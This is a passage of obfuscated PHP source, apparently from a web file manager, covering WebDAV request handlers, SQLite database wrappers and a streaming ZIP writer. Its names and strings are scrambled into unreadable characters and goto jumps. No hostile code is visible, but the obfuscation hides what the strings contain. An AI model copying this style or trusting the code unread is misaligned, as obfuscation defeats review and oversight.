eí‹¡ƒØô: $fÒæõ±‘±µ = @fopen($dœ‰†‚Ê‘ë, $A£¿¿ïŞ¨¹[1526]); $B­©é¥İ»æ = @fopen($A£¿¿ïŞ¨¹[1819], $A£¿¿ïŞ¨¹[1525]); if (!$B­©é¥İ»æ || !$fÒæõ±‘±µ) { @unlink($dœ‰†‚Ê‘ë); return !1; } goto dÖà¬œË¤; Fñ¯ôÄ×ÎÅ: $A£¿¿ïŞ¨¹ =& $_SERVER[´Ù×Íå‘ÄõÛ]; @mk_dir(TEMP_FILES); $dœ‰†‚Ê‘ë = TEMP_FILES . $A£¿¿ïŞ¨¹[1818] . rand_string(32); goto eí‹¡ƒØô; dÖà¬œË¤: while (!feof($B­©é¥İ»æ)) { fwrite($fÒæõ±‘±µ, fread($B­©é¥İ»æ, 1024 * 200)); } fclose($B­©é¥İ»æ); fclose($fÒæõ±‘±µ); goto c™ŠšáÉÍ†; c™ŠšáÉÍ†: if (@filesize($dœ‰†‚Ê‘ë) > 0) { return $dœ‰†‚Ê‘ë; } @unlink($dœ‰†‚Ê‘ë); return !1; goto eá“™©˜…; eá“™©˜…: } public function httpMKCOL() { $F¡ÕÀ·‰  =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->pathExists($this->path)) { return array($F¡ÕÀ·‰ [1036] => 409); } $d¹Œ˜¯ñ… = $this->pathMkdir($this->path); return array($F¡ÕÀ·‰ [1036] => $d¹Œ˜¯ñ… ? 201 : 403); } public function httpMOVE() { $Bƒ¥¶Ë·Ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $F¼ÛÖÊÚ¨Ò = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$Bƒ¥¶Ë·Ñ[1820]])) { $B—÷ÙºˆÆä[$Bƒ¥¶Ë·Ñ[1821]] = $_SERVER[$Bƒ¥¶Ë·Ñ[1820]] == $Bƒ¥¶Ë·Ñ[1822]; } $d¥–ùİñìİ = $this->pathMove($this->path, $F¼ÛÖÊÚ¨Ò); return array($Bƒ¥¶Ë·Ñ[1036] => $d¥–ùİñìİ ? 201 : 404); } public function httpCOPY() { $cŞãÆ…† = $this->parsePath($this->pathGet(!0)); $D¢± ±‚ËÄ = $this->pathCopy($this->path, $cŞãÆ…†); return array($_SERVER[´Ù×Íå‘ÄõÛ][1036] => $D¢± ±‚ËÄ ? 201 : 404); } public function httpDELETE() { $A´‰Š«ç„í = $this->pathRemove($this->path); return array($_SERVER[´Ù×Íå‘ÄõÛ][1036] => $A´‰Š«ç„í ? 200 : 503); } public function httpLOCK() { $CŠ«œìÉ…À =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cÙ£¥Ã¦Ş = md5($this->path); $DÅÉÏ˜±•± = $CŠ«œìÉ…À[1823] . $this->xmlGet($CŠ«œìÉ…À[1824]) . $CŠ«œìÉ…À[1825] . $cÙ£¥Ã¦Ş . $CŠ«œìÉ…À[1826]; return array($CŠ«œìÉ…À[1036] => 200, $CŠ«œìÉ…À[1211] => array($CŠ«œìÉ…À[1827] . $cÙ£¥Ã¦Ş, $CŠ«œìÉ…À[1828]), $CŠ«œìÉ…À[1829] => $DÅÉÏ˜±•±); } public function httpUNLOCK() { return array($_SERVER[´Ù×Íå‘ÄõÛ][1036] => 204); } public function xmlGet($E»Í‰•Æï) { goto EîÓ‚¶–ñ”; EîÓ‚¶–ñ”: $FÛÚ•‡£Â =& $_SERVER[´Ù×Íå‘ÄõÛ]; static $bùÍÒŞ¦‰œ = false; if (!$bùÍÒŞ¦‰œ) { $D¢ã Œ«›â = file_get_contents($FÛÚ•‡£Â[1830]); $bùÍÒŞ¦‰œ = new DOMDocument(); $bùÍÒŞ¦‰œ->loadXML($D¢ã Œ«›â); } goto b•ÃÅÜŠ; b•ÃÅÜŠ: $D¶ÇôÃ¸Œ = explode($FÛÚ•‡£Â[8], $E»Í‰•Æï); $Aš’¹À‰ÁÀ = array_shift($D¶ÇôÃ¸Œ); $eîé‚‚‘ˆÌ = $bùÍÒŞ¦‰œ->getElementsByTagNameNS($FÛÚ•‡£Â[1831], $Aš’¹À‰ÁÀ); goto D†¨á¢¬˜; D†¨á¢¬˜: if ($eîé‚‚‘ˆÌ) { return $eîé‚‚‘ˆÌ[0]->nodeValue; } return $FÛÚ•‡£Â[33]; goto aÅ–Ÿ¦õ•Ï; aÅ–Ÿ¦õ•Ï: } public static function response($BóÖŒ¯‘ô•) { goto Fšƒãš; FöË‘İõô: if (is_string($BóÖŒ¯‘ô•[$Eã”Äã®ì[1829]])) { header($Eã”Äã®ì[1832]); $eø«×øİãà = $Eã”Äã®ì[1833] . $Eã”Äã®ì[217] . $BóÖŒ¯‘ô•[$Eã”Äã®ì[1829]]; echo $eø«×øİãà; } goto f™×ÛŸ÷³»; Fšƒãš: $Eã”Äã®ì =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f¯½¯‚£ = is_array($BóÖŒ¯‘ô•[$Eã”Äã®ì[1211]]) ? $BóÖŒ¯‘ô•[$Eã”Äã®ì[1211]] : array(); $f¯½¯‚£[] = HttpHeader::code($BóÖŒ¯‘ô•[$Eã”Äã®ì[1036]]); goto AŒë›’ßÈŠ; AŒë›’ßÈŠ: $f¯½¯‚£[] = $Eã”Äã®ì[1771]; $f¯½¯‚£[] = $Eã”Äã®ì[1772]; foreach ($f¯½¯‚£ as $b”ò‚ë–ÁÆ) { header($b”ò‚ë–ÁÆ); } goto FöË‘İõô; f™×ÛŸ÷³»: } } goto fô£¯’ùÒ; DÕ´ÎĞòÈ: define($_SERVER[´Ù×Íå‘ÄõÛ][1943], 5); define($_SERVER[´Ù×Íå‘ÄõÛ][1944], 16); define($_SERVER[´Ù×Íå‘ÄõÛ][1945], 32); goto fÏÚ·‚Œò¹; e½Ááô„©š: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto d…îšõâ‡¯; BğÀªîäçÌ: $this->in =& $in; $this->values[$d„½Æ¿Œôœ[6]] =& $config; $this->values[$d„½Æ¿Œôœ[7]] =& $in; goto DÃ´–’“§Ë; d…îšõâ‡¯: $d„½Æ¿Œôœ =& $_SERVER[´Ù×Íå‘ÄõÛ]; global $in, $config; $this->config =& $config; goto BğÀªîäçÌ; DÃ´–’“§Ë: $this->tpl = TEMPLATE . MOD . $d„½Æ¿Œôœ[8]; $this->_classObjectID = mt_rand(0, 10000); goto FÒ‡œëª¼ó; FÒ‡œëª¼ó: } public function loadClass($cÏãŞßŠ•Š) { if (1 === func_num_args()) { $this->{$cÏãŞßŠ•Š} = new $cÏãŞßŠ•Š(); } else { $dµšÑá’‹ = new ReflectionClass($cÏãŞßŠ•Š); $C†ÒëÅÉ¬ = func_get_args(); array_shift($C†ÒëÅÉ¬); $this->{$cÏãŞßŠ•Š} = $dµšÑá’‹->newInstanceArgs($C†ÒëÅÉ¬); } return $this->{$cÏãŞßŠ•Š}; } protected function assign($c„ê¢¸¶‰å, $e­ßÈÀºÊ‹) { $this->values[$c„ê¢¸¶‰å] = $e­ßÈÀºÊ‹; } protected function display($bš¿íÃÒÇ) { ob_end_clean(); extract($this->values); require $this->tpl . $bš¿íÃÒÇ; } } class DbSqliteBase extends Db { public function __construct($aÌ²ÕÈ×Ü = '') { $B¤İ é½–ƒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!extension_loaded($B¤İ é½–ƒ[9])) { think_exception(think_lang($B¤İ é½–ƒ[10]) . $B¤İ é½–ƒ[11]); } if (!empty($aÌ²ÕÈ×Ü)) { if (!isset($aÌ²ÕÈ×Ü[$B¤İ é½–ƒ[12]])) { $aÌ²ÕÈ×Ü[$B¤İ é½–ƒ[12]] = 438; } $this->config = $aÌ²ÕÈ×Ü; if (empty($this->config[$B¤İ é½–ƒ[13]])) { $this->config[$B¤İ é½–ƒ[13]] = array(); } } } public function connect($d‡¿é“¼âÂ = '', $a¿ºº£¢—É = 0) { $Dˆääì®” =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($this->linkID[$a¿ºº£¢—É])) { goto bŠÛÚĞóš¿; bŠÛÚĞóš¿: if (empty($d‡¿é“¼âÂ)) { $d‡¿é“¼âÂ = $this->config; } $FÜ•Ã›Ùö¼ = !empty($d‡¿é“¼âÂ[$Dˆääì®”[13]][$Dˆääì®”[14]]) ? $d‡¿é“¼âÂ[$Dˆääì®”[13]][$Dˆääì®”[14]] : $this->pconnect; $CÖÁÀÅò®ª = $FÜ•Ã›Ùö¼ ? $Dˆääì®”[15] : $Dˆääì®”[16]; goto DÚ–ù•œ±É; Fö¾¨„Ğš†: @sqlite_busy_timeout($this->linkID[$a¿ºº£¢—É], 30000); if (1 != think_config($Dˆääì®”[18])) { unset($this->config); } goto e˜Èå´££; DÚ–ù•œ±É: $this->linkID[$a¿ºº£¢—É] = $CÖÁÀÅò®ª($d‡¿é“¼âÂ[$Dˆääì®”[17]], $d‡¿é“¼âÂ[$Dˆääì®”[12]]); if (!$this->linkID[$a¿ºº£¢—É]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Fö¾¨„Ğš†; e˜Èå´££: } return $this->linkID[$a¿ºº£¢—É]; } public function free() { $this->queryID = null; } public function query($C§ÔÌá½ƒÏ) { goto Eå÷Øâ£‹¬; Fï¬»¯†ç: $this->queryStr = $C§ÔÌá½ƒÏ; if ($this->queryID) { $this->free(); } think_action_status($Añ‰—˜£ñ[19], 1); goto dÔµå—ÚêĞ; dÔµå—ÚêĞ: think_status($Añ‰—˜£ñ[20]); $this->queryID = sqlite_query($this->_linkID, $C§ÔÌá½ƒÏ); $this->debug(); goto bóª­™¢’; Eå÷Øâ£‹¬: $Añ‰—˜£ñ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Fï¬»¯†ç; bóª­™¢’: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $E¦ÓÇŸìÛÖ = $this->getAll(); return $E¦ÓÇŸìÛÖ; } goto dä„•‘Áà®; dä„•‘Áà®: } public function execute($aÕ… é—óÆ) { goto dÈÒõÄï¹; dÈÒõÄï¹: $C¢†¿¯„è =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d›ä¸›Šë²; dÇ’Ê¦‹éª: if (!1 === $bÖœ«ÙÛŸ») { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto AßÇæ³Ş ½; eµáâÁ÷¯: think_status($C¢†¿¯„è[20]); $bÖœ«ÙÛŸ» = sqlite_exec($this->_linkID, $aÕ… é—óÆ); $this->debug(); goto dÇ’Ê¦‹éª; d›ä¸›Šë²: $this->queryStr = $aÕ… é—óÆ; if ($this->queryID) { $this->free(); } think_action_status($C¢†¿¯„è[21], 1); goto eµáâÁ÷¯; AßÇæ³Ş ½: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[´Ù×Íå‘ÄõÛ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $EŠàæó«œ = sqlite_query($this->_linkID, $_SERVER[´Ù×Íå‘ÄõÛ][23]); if (!$EŠàæó«œ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dæ³çøõáî = sqlite_query($this->_linkID, $_SERVER[´Ù×Íå‘ÄõÛ][24]); if (!$Dæ³çøõáî) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $fáëê¥áÊÏ = array(); if ($this->numRows > 0) { for ($eáÊË¤¶‡ = 0; $eáÊË¤¶‡ < $this->numRows; $eáÊË¤¶‡++) { $fáëê¥áÊÏ[$eáÊË¤¶‡] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $fáëê¥áÊÏ; } public function getFields($aŠÑ÷êì°¼) { $AÒöĞ¶óØŒ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $fí¦Ö•§«£ = $this->query($AÒöĞ¶óØŒ[25] . $aŠÑ÷êì°¼ . $AÒöĞ¶óØŒ[26]); $DÆéİôÜƒ = array(); if ($fí¦Ö•§«£) { foreach ($fí¦Ö•§«£ as $B“•ÅŸéœÈ => $bÕÏ¿ÎÉ¾á) { $DÆéİôÜƒ[$bÕÏ¿ÎÉ¾á[$AÒöĞ¶óØŒ[27]]] = array($AÒöĞ¶óØŒ[28] => $bÕÏ¿ÎÉ¾á[$AÒöĞ¶óØŒ[27]], $AÒöĞ¶óØŒ[29] => $bÕÏ¿ÎÉ¾á[$AÒöĞ¶óØŒ[30]], $AÒöĞ¶óØŒ[31] => (bool) ($bÕÏ¿ÎÉ¾á[$AÒöĞ¶óØŒ[32]] === $AÒöĞ¶óØŒ[33]), $AÒöĞ¶óØŒ[34] => $bÕÏ¿ÎÉ¾á[$AÒöĞ¶óØŒ[35]], $AÒöĞ¶óØŒ[36] => strtolower($bÕÏ¿ÎÉ¾á[$AÒöĞ¶óØŒ[37]]) == $AÒöĞ¶óØŒ[38], $AÒöĞ¶óØŒ[39] => strtolower($bÕÏ¿ÎÉ¾á[$AÒöĞ¶óØŒ[40]]) == $AÒöĞ¶óØŒ[41]); } } return $DÆéİôÜƒ; } public function getTables($Bã‹óÀ÷È = '') { $bòóÛ˜‚ŠØ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $f¤›°êìª = $this->query($bòóÛ˜‚ŠØ[42] . $bòóÛ˜‚ŠØ[43] . $bòóÛ˜‚ŠØ[44]); $aøºãÁö‰ = array(); foreach ($f¤›°êìª as $E¹‚êÙ‹Œ² => $Dù©×Š³†í) { $aøºãÁö‰[$E¹‚êÙ‹Œ²] = current($Dù©×Š³†í); } return $aøºãÁö‰; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $eÆ­ĞÁ™¨ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $aÚ‡›´ïèÉ = sqlite_last_error($this->_linkID); $this->error = $aÚ‡›´ïèÉ . $eÆ­ĞÁ™¨[4] . sqlite_error_string($aÚ‡›´ïèÉ); if ($eÆ­ĞÁ™¨[33] != $this->queryStr) { $this->error .= LNG($eÆ­ĞÁ™¨[45]) . $this->queryStr; } think_trace($this->error, $eÆ­ĞÁ™¨[33], $eÆ­ĞÁ™¨[46]); return $this->error; } public function escapeString($EÔé¦À–âù) { return sqlite_escape_string($EÔé¦À–âù); } public function parseLimit($Eñ¾•ÕË’) { $F´ÇÆ‘Äàâ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÔë¡ÊéŠ = $F´ÇÆ‘Äàâ[33]; if (!empty($Eñ¾•ÕË’)) { $Eñ¾•ÕË’ = explode($F´ÇÆ‘Äàâ[47], $Eñ¾•ÕË’); if (count($Eñ¾•ÕË’) > 1) { $FÔë¡ÊéŠ .= $F´ÇÆ‘Äàâ[48] . $Eñ¾•ÕË’[1] . $F´ÇÆ‘Äàâ[49] . $Eñ¾•ÕË’[0] . $F´ÇÆ‘Äàâ[50]; } else { $FÔë¡ÊéŠ .= $F´ÇÆ‘Äàâ[48] . $Eñ¾•ÕË’[0] . $F´ÇÆ‘Äàâ[50]; } } return $FÔë¡ÊéŠ; } } class DbSqlite3Base extends Db { public function __construct($FÌ·Ó¹“‚º = '') { $F¨ğëíğ©İ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!class_exists($F¨ğëíğ©İ[51])) { think_exception(think_lang($F¨ğëíğ©İ[10]) . $F¨ğëíğ©İ[52]); } if (!empty($FÌ·Ó¹“‚º)) { if (!isset($FÌ·Ó¹“‚º[$F¨ğëíğ©İ[12]])) { $FÌ·Ó¹“‚º[$F¨ğëíğ©İ[12]] = 438; } $this->config = $FÌ·Ó¹“‚º; if (empty($this->config[$F¨ğëíğ©İ[13]])) { $this->config[$F¨ğëíğ©İ[13]] = array(); } } } public function connect($Cí¾ˆ Ã×ß = '', $a¼Œ¦Ú™Ò• = 0) { $C÷‹µ¸°’¸ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!isset($this->linkID[$a¼Œ¦Ú™Ò•])) { if (empty($Cí¾ˆ Ã×ß)) { $Cí¾ˆ Ã×ß = $this->config; } $this->linkID[$a¼Œ¦Ú™Ò•] = new SQLite3($Cí¾ˆ Ã×ß[$C÷‹µ¸°’¸[17]]); if (!$this->linkID[$a¼Œ¦Ú™Ò•]) { think_exception($this->linkID[$a¼Œ¦Ú™Ò•]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$a¼Œ¦Ú™Ò•]->busyTimeout(30000); if (1 != think_config($C÷‹µ¸°’¸[18])) { unset($this->config); } } return $this->linkID[$a¼Œ¦Ú™Ò•]; } public function free() { $this->queryID = null; } public function query($cÍÁìÃ©Š) { goto f“Š‚Ş´Š¶; bî¥…ò½¸: think_status($c‘®ÇÂ‚ì¤[20]); $this->queryID = $this->_linkID->query($cÍÁìÃ©Š); $this->debug(); goto FªŠ³Şå¥‘; f“Š‚Ş´Š¶: $c‘®ÇÂ‚ì¤ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÆÙÖ‡Ôê; FªŠ³Şå¥‘: if (!1 === $this->queryID) { $this->error(); return !1; } else { $eğ„ò®£Ä© = $this->getAll(); $this->numRows = count($eğ„ò®£Ä©); return $eğ„ò®£Ä©; } goto EÚË˜÷µ»; CÆÙÖ‡Ôê: $this->queryStr = $cÍÁìÃ©Š; if ($this->queryID) { $this->free(); } think_action_status($c‘®ÇÂ‚ì¤[19], 1); goto bî¥…ò½¸; EÚË˜÷µ»: } public function execute($C£Ë«ÓŠåª) { goto eÔœ“…Ÿ‚; dë×»ó×†: think_status($F›¹ê½Şäà[20]); $C‚âˆ©Ğ’¶ = $this->_linkID->exec($C£Ë«ÓŠåª); $this->debug(); goto d¡¼Èƒ¹İ»; d¡¼Èƒ¹İ»: if (!1 === $C‚âˆ©Ğ’¶) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto E×„‰ä; eÔœ“…Ÿ‚: $F›¹ê½Şäà =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f›¢¨òÎÄ; f›¢¨òÎÄ: $this->queryStr = $C£Ë«ÓŠåª; if ($this->queryID) { $this->free(); } think_action_status($F›¹ê½Şäà[21], 1); goto dë×»ó×†; E×„‰ä: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[´Ù×Íå‘ÄõÛ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $A÷ó×«× = $this->_linkID->query($_SERVER[´Ù×Íå‘ÄõÛ][23]); if (!$A÷ó×«×) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $eâÍì´š¼ = $this->_linkID->query($_SERVER[´Ù×Íå‘ÄõÛ][24]); if (!$eâÍì´š¼) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f –ØÃ‘ºµ = array(); while ($FÇê½‘“÷Î = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $f –ØÃ‘ºµ[] = $FÇê½‘“÷Î; } $this->queryID->reset(); return $f –ØÃ‘ºµ; } public function getFields($A£ãã¡®§ï) { $CªÆù¶ÌÌ¾ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Fºõéˆ¤×é = $this->query($CªÆù¶ÌÌ¾[25] . $A£ãã¡®§ï . $CªÆù¶ÌÌ¾[26]); $f©“âÍ“§É = array(); if ($Fºõéˆ¤×é) { foreach ($Fºõéˆ¤×é as $aëâ¤Òì×± => $FÑ¥×ì¦“¬) { $f©“âÍ“§É[$FÑ¥×ì¦“¬[$CªÆù¶ÌÌ¾[28]]] = array($CªÆù¶ÌÌ¾[28] => $FÑ¥×ì¦“¬[$CªÆù¶ÌÌ¾[28]], $CªÆù¶ÌÌ¾[29] => $FÑ¥×ì¦“¬[$CªÆù¶ÌÌ¾[29]], $CªÆù¶ÌÌ¾[31] => (bool) ($FÑ¥×ì¦“¬[$CªÆù¶ÌÌ¾[31]] === $CªÆù¶ÌÌ¾[33]), $CªÆù¶ÌÌ¾[34] => $FÑ¥×ì¦“¬[$CªÆù¶ÌÌ¾[53]], $CªÆù¶ÌÌ¾[36] => (bool) $FÑ¥×ì¦“¬[$CªÆù¶ÌÌ¾[54]], $CªÆù¶ÌÌ¾[39] => (bool) $FÑ¥×ì¦“¬[$CªÆù¶ÌÌ¾[54]]); } } return $f©“âÍ“§É; } public function getTables($bâ‰«•å´ = '') { $cÜ½î›ò‰“ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CŠ˜ŒØš‰ = $this->query($cÜ½î›ò‰“[42] . $cÜ½î›ò‰“[43] . $cÜ½î›ò‰“[44]); $eà†™äÅÅ = array(); foreach ($CŠ˜ŒØš‰ as $Fà‘‘Úš³Ÿ => $E÷ÒØÒ˜Øª) { $eà†™äÅÅ[$Fà‘‘Úš³Ÿ] = current($E÷ÒØÒ˜Øª); } return $eà†™äÅÅ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $B”Ê¿ÍöŠ¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->error = $this->_linkID->lastErrorMsg(); if ($B”Ê¿ÍöŠ¼[33] != $this->queryStr) { $this->error .= LNG($B”Ê¿ÍöŠ¼[45]) . $this->queryStr; } think_trace($this->error, $B”Ê¿ÍöŠ¼[33], $B”Ê¿ÍöŠ¼[46]); return $this->error; } public function escapeString($e«ˆÖí†Ú) { $DºŒÉ‰êÛÙ =& $_SERVER[´Ù×Íå‘ÄõÛ]; if ($this->_linkID) { return $this->_linkID->escapeString($e«ˆÖí†Ú); } return str_ireplace($DºŒÉ‰êÛÙ[55], $DºŒÉ‰êÛÙ[56], $e«ˆÖí†Ú); } public function parseLimit($fœ¡Ã·»¯) { $b¥é½²¡İ¥ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C¤ÇÂğˆ· = $b¥é½²¡İ¥[33]; if (!empty($fœ¡Ã·»¯)) { $fœ¡Ã·»¯ = explode($b¥é½²¡İ¥[47], $fœ¡Ã·»¯); if (count($fœ¡Ã·»¯) > 1) { $C¤ÇÂğˆ· .= $b¥é½²¡İ¥[48] . $fœ¡Ã·»¯[1] . $b¥é½²¡İ¥[49] . $fœ¡Ã·»¯[0] . $b¥é½²¡İ¥[50]; } else { $C¤ÇÂğˆ· .= $b¥é½²¡İ¥[48] . $fœ¡Ã·»¯[0] . $b¥é½²¡İ¥[50]; } } return $C¤ÇÂğˆ·; } } goto FØ¸•ÉˆØ; B¨ôÃÕ†îï: class ZipMake { const VERSION = "\60\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($fÉåÈì‰ºÁ = null) { $B£ÍŞ è  =& $_SERVER[´Ù×Íå‘ÄõÛ]; $this->outputStream = fopen($B£ÍŞ è [2016], $B£ÍŞ è [1230]); $this->outputName = $fÉåÈì‰ºÁ; $this->needHeaders = !0; } public function addFile($CÅÚÙ…õÒÓ, $F¼ŞÉÌ¯×Ú) { goto b¼÷¹Ã¬æ; fİÈÌ‰¾Œ»: $this->addFileFooter($CÅÚÙ…õÒÓ, $F˜´“ãÊˆç, $DÓæ©¨˜®ß, $E‰ƒ æ¡Íª, $DŒÃŸ‘õÂ, $AŸæÈ†ÒŠ‚); goto B†ã‰Üæ†„; C²ó–áÕò¢: while (!feof($EŠˆäç„ÕÀ)) { $Aéˆ„»³Çñ = fread($EŠˆäç„ÕÀ, 1048576); $this->send($Aéˆ„»³Çñ); } fclose($EŠˆäç„ÕÀ); $DÓæ©¨˜®ß = hexdec(hash_file($a®·‡‡ôÉ[2018], $F¼ŞÉÌ¯×Ú)); goto fİÈÌ‰¾Œ»; D¢ÉÀå‹: $AŸæÈ†ÒŠ‚ = $this->addFileHeader($CÅÚÙ…õÒÓ, $F˜´“ãÊˆç); $E‰ƒ æ¡Íª = $DŒÃŸ‘õÂ = filesize($F¼ŞÉÌ¯×Ú); $EŠˆäç„ÕÀ = fopen($F¼ŞÉÌ¯×Ú, $a®·‡‡ôÉ[2017]); goto C²ó–áÕò¢; b¼÷¹Ã¬æ: $a®·‡‡ôÉ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÅÚÙ…õÒÓ = $this->filterFilename($CÅÚÙ…õÒÓ); $F˜´“ãÊˆç = static::METHOD_STORE; goto D¢ÉÀå‹; B†ã‰Üæ†„: } public function addFileFromStream($Eó†ªØÀƒ, $E¸¾¢ ÅÑØ) { goto FŒéŞš«; D‘„àÙƒ¡·: $this->addFileFooter($Eó†ªØÀƒ, $cÍ–Â½àè, $Eé’»Èêà, $Aí£æâšõˆ, $eÕ ï½§‚, $f­ç•ô Úß); goto AÚÈÅê³ò; F®ÔÀõ‚Ã‘: fseek($E¸¾¢ ÅÑØ, 0, SEEK_END); $Aí£æâšõˆ = $eÕ ï½§‚ = ftell($E¸¾¢ ÅÑØ); rewind($E¸¾¢ ÅÑØ); goto e°§…¨†«­; e°§…¨†«­: $E“î”»¦ˆŒ = hash_init($_SERVER[´Ù×Íå‘ÄõÛ][2018]); while (!feof($E¸¾¢ ÅÑØ)) { $a‡©«ŠÚÈÃ = fread($E¸¾¢ ÅÑØ, 1048576); hash_update($E“î”»¦ˆŒ, $a‡©«ŠÚÈÃ); $this->send($a‡©«ŠÚÈÃ); } $Eé’»Èêà = hexdec(hash_final($E“î”»¦ˆŒ)); goto D‘„àÙƒ¡·; FŒéŞš«: $Eó†ªØÀƒ = $this->filterFilename($Eó†ªØÀƒ); $cÍ–Â½àè = static::METHOD_STORE; $f­ç•ô Úß = $this->addFileHeader($Eó†ªØÀƒ, $cÍ–Â½àè); goto F®ÔÀõ‚Ã‘; AÚÈÅê³ò: } public function finish() { foreach ($this->files as $bÖ÷Ì Úç‹) { $this->addCdrFile($bÖ÷Ì Úç‹); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($CáóÂëÈ°, $EÉ¡ª×ÚØ) { goto cÂàô¡è‹; cÂàô¡è‹: $fóä†‹™¯« =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CáóÂëÈ° = preg_replace($fóä†‹™¯«[2019], $fóä†‹™¯«[33], $CáóÂëÈ°); $fİÊŠØØÈ = strlen($CáóÂëÈ°); goto F—ïÌğÎæ; a“…ùôºê‰: $c“ŞÂ½ì¼¶ = $this->packFields($A·¸õÂºÁ ); $AÙâ·™§ì = $this->packFields($B‹ì‚ĞÎ«Ä); $this->send($c“ŞÂ½ì¼¶ . $CáóÂëÈ° . $AÙâ·™§ì); goto aÏ³³ŸŞÁš; F—ïÌğÎæ: $D¾½’ô¨˜½ = $this->dosTime(time()); $A·¸õÂºÁ  = array(array($fóä†‹™¯«[2020], static::FILE_HEADER_SIGNATURE), array($fóä†‹™¯«[2021], static::ZIP_VERSION_64), array($fóä†‹™¯«[2021], 8), array($fóä†‹™¯«[2021], $EÉ¡ª×ÚØ), array($fóä†‹™¯«[2020], $D¾½’ô¨˜½), array($fóä†‹™¯«[2020], 0), array($fóä†‹™¯«[2020], 4294967295), array($fóä†‹™¯«[2020], 4294967295), array($fóä†‹™¯«[2021], $fİÊŠØØÈ), array($fóä†‹™¯«[2021], 32)); $B‹ì‚ĞÎ«Ä = array(array($fóä†‹™¯«[2021], 1), array($fóä†‹™¯«[2021], 28), array($fóä†‹™¯«[2022], 0), array($fóä†‹™¯«[2022], 0), array($fóä†‹™¯«[2022], 0), array($fóä†‹™¯«[2020], 0)); goto a“…ùôºê‰; aÏ³³ŸŞÁš: return strlen($c“ŞÂ½ì¼¶) + $fİÊŠØØÈ + strlen($AÙâ·™§ì); goto d…´¼Ş‰ĞÄ; d…´¼Ş‰ĞÄ: } protected function addFileFooter($BÉª‡âãÛ, $c¢ìïŒ—óÃ, $fÄÎÛå²î, $CÛ…ïñÂï, $E‹šœè©Ü, $C¡¯õÈ±Í¯) { $f¦ã‚–é¼Ş =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A”‡‘¯Ã«á = array(array($f¦ã‚–é¼Ş[2020], static::DATA_DESCRIPTOR_SIGNATURE), array($f¦ã‚–é¼Ş[2020], $fÄÎÛå²î), array($f¦ã‚–é¼Ş[2022], $CÛ…ïñÂï), array($f¦ã‚–é¼Ş[2022], $E‹šœè©Ü)); $f¥¬áôÈò¥ = $this->packFields($A”‡‘¯Ã«á); $this->send($f¥¬áôÈò¥); $f³Åøí©ŞÒ = $C¡¯õÈ±Í¯ + $CÛ…ïñÂï + $B£Ùˆİ¸¹; $this->addToCdr($BÉª‡âãÛ, $c¢ìïŒ—óÃ, $fÄÎÛå²î, $CÛ…ïñÂï, $E‹šœè©Ü, $f³Åøí©ŞÒ); } private function addToCdr($e±ì‹ÕæğÒ, $DîÜŒ¤“Õ, $bğ·æÙ±Ó´, $cœÙÕ—Ø‹ì, 